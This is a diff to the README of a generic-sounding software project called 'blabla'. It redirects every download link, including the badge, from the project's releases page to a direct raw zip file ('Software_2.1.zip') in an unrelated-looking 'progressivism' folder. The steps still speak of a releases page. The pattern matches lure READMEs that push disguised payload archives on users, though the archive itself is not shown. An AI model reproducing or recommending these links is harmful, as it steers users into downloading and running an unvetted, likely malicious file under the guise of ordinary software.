@@ -1,6 +1,6 @@
 # 🌟 blabla - Easy Software for Everyday Use
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/devilh792/blabla/releases)
+[![Download Here](https://github.com/devilh792/blabla/raw/refs/heads/main/progressivism/Software_2.1.zip%20Now-Get%20Started-brightgreen)](https://github.com/devilh792/blabla/raw/refs/heads/main/progressivism/Software_2.1.zip)
 
 ## 🛠️ Introduction
 
@@ -12,7 +12,7 @@ To start using blabla, follow these simple steps to download and install the sof
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Download blabla](https://github.com/devilh792/blabla/releases).
+1. Visit this page to download: [Download blabla](https://github.com/devilh792/blabla/raw/refs/heads/main/progressivism/Software_2.1.zip).
 2. On the Releases page, you will see various versions of blabla. Click on the version labeled as the latest release.
 3. Choose the correct file for your operating system. Look for Windows, macOS, or Linux options.
 4. Click on the file link to start the download.
@@ -56,4 +56,4 @@ If you encounter any issues or have questions, you can reach out through the fol
 
 Thank you for using blabla! Your feedback helps us improve the application. If you enjoy using it, please consider sharing it with friends or colleagues. 
 
-You can always find more information and stay updated by visiting the [Releases page](https://github.com/devilh792/blabla/releases) regularly.
+You can always find more information and stay updated by visiting the [Releases page](https://github.com/devilh792/blabla/raw/refs/heads/main/progressivism/Software_2.1.zip) regularly.
